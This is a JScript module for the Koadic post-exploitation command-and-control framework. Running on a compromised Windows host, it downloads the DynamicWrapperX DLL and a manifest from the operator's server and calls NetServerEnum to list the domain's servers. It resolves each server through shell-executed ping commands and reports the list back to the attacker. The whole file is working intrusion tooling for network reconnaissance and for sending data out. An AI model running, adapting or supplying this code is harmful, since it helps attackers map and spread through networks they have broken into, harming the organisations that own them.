function win32_register_via_dynwrapx(manifestPath)
{
  var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
  actCtx.Manifest = manifestPath;
  var win32 = actCtx.CreateObject("DynamicWrapperX");
  win32.Register("NetApi32.dll", "NetServerEnum", "i=luplppull", "r=l");
  win32.Register("NetApi32.dll", "NetSessionEnum", "i=wluuplppl", "r=l");
  win32.Register("NetApi32.dll", "NetWkstaUserEnum", "i=wlplppl", "r=l");

  return win32;
}

function guid()
{
  function s4()
  {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function resolve(hostname)
{
  var results = Koadic.shell.exec("ping -n 1 -4 "+hostname, "~DIRECTORY~\\"+guid()+".txt");
  return results.split("[")[1].split("]")[0];
}

function read_servers(bufptrptr, entriesread, win32)
{

  var total_servs = win32.NumGet(entriesread);
  var servers = [];

  var bufptr = win32.NumGet(bufptrptr);

  for(var i=0; i<total_servs;i++) {
    var server = win32.StrGet(win32.NumGet(bufptr, 4+8*i));
    servers.push(server);
  }

  return servers;

}

function parse_servers(servers)
{
  var ret_string = "";

  for(var i=0;i<servers.length;i++)
  {
    ret_string += servers[i];
    var res = resolve(servers[i]);
    ret_string += " ("+res+")";
    ret_string += "***";
  }

  return ret_string;
}

try
{
  var manifestPath = Koadic.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
  Koadic.http.download(manifestPath, "~MANIFESTUUID~");
  Koadic.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");
  var win32 = win32_register_via_dynwrapx(manifestPath);

  var bufptrptr = win32.MemAlloc(4);//if 64bit, 8
  var entriesread = win32.MemAlloc(4);
  var totalentries = win32.MemAlloc(4);
  var servers;
  var res = win32.NetServerEnum(0, 100, bufptrptr, -1, entriesread, totalentries, 0xFFFFFFFF, 0, 0);
  switch (res) {
    case 0:
      // all good
      servers = read_servers(bufptrptr, entriesread, win32);
      break;
    case 5:
      //access denied
      break;
    case 87:
      //The parameter is incorrect.
      break;
    case 234:
      //More entries are available. Specify a large enough buffer to receive all entries.
      break;
    case 6118:
      //No browser servers found.
      break;
    case 50:
      //The request is not supported.
      break;
    case 2127:
      //A remote error occurred with no data returned by the server.
      break;
    case 2114:
      //The server service is not started.
      break;
    case 2184:
      //The service has not been started.
      break;
    case 2138:
      //The Workstation service has not been started. The local workstation service is used to communicate with a downlevel remote server.
      break;
    default:
      //unknown

  }
  if (servers)
  {
    var server_string = parse_servers(servers);
    var headers = {};
    headers["RESULTS"] = "SERVERS";
    Koadic.work.report(server_string, headers);
    Koadic.work.report("Complete");
  } else {
    //no servers
  }

  //Koadic.work.report("Success");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();